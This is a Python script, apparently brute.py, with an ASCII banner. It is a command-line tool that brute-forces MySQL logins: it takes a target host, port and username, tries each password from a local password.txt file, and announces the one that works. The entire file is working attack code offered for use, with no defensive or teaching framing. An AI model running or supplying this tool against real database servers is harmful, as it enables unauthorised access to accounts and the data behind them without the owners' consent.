import mysql.connector
from concurrent.futures import ThreadPoolExecutor as T
import argparse

class system:
    def __init__(self, hosts, port, user, thread = 0):
        self.hosts = hosts
        self.port = port
        self.user = user
        self.proc(thread)

    def con(self, hosts, port, username, passwords):
        try:
            conn = mysql.connector.connect(
                host=hosts,
                port=port,
                user=username,
                password=passwords
            )
            if conn.is_connected():
                return True
            else:
                return False
            conn.close()
        except mysql.connector.Error as err:
            return False
    
    def open_list(self):
        with open("password.txt", "r") as files:
            file = files.readlines()
            exp_file = [file.replace("\n", "") for file in file]
            return exp_file
    
    def proc(self, thread = 0):
        try:
            if thread:
                with T(max_workers=thread) as executor:
                    for list in self.open_list():
                        if executor.submit(self.con, self.hosts, self.port, self.user, list).result() == False:
                            print(f"\033[33m{list} \033[37m=> \033[31mNot a password")
                        else:
                            print(f"\033[33m{list} \033[37m=> \033[32mThis is the password")
                            break
            else:
                for list in self.open_list():
                    if self.con(self.hosts, self.port, self.user, list) == False:
                        print(f"\033[33m{list} \033[37m=> \033[31mNot a password")
                    else:
                        print(f"\033[33m{list} \033[37m=> \033[32mThis is the password")
                        break
        except KeyboardInterrupt:
            print("\033[37m[*] Exiting program...")

if __name__ == "__main__":
    print(""" __  __        _____  ____  _      ____  ______ 
|  \/  |      / ____|/ __ \| |    |  _ \|  ____|
| \  / |_   _| (___ | |  | | |    | |_) | |__   
| |\/| | | | |\___ \| |  | | |    |  _ <|  __|  
| |  | | |_| |____) | |__| | |____| |_) | |     
|_|  |_|\__, |_____/ \___\_\______|____/|_|     
         __/ |                                  
        |___/                                   

python3 brute.py -h for help
          """)
    parser = argparse.ArgumentParser()
    parser.add_argument("-H", "--hosts", help="Enter your host target", type=str, required=True)
    parser.add_argument("-u", "--username", help="Enter your username target", type=str, required=True)
    parser.add_argument("-p", "--port", help="Enter your port target (Default: 3306)", type=int, default=3306)
    parser.add_argument("-t", "--thread", help="Enter your thread", type=int, default=0)
    args = parser.parse_args()
    if args.hosts and args.username and args.port:
        system(args.hosts, args.port, args.username, args.thread)
    else:
        print("python3 brute.py -h for help")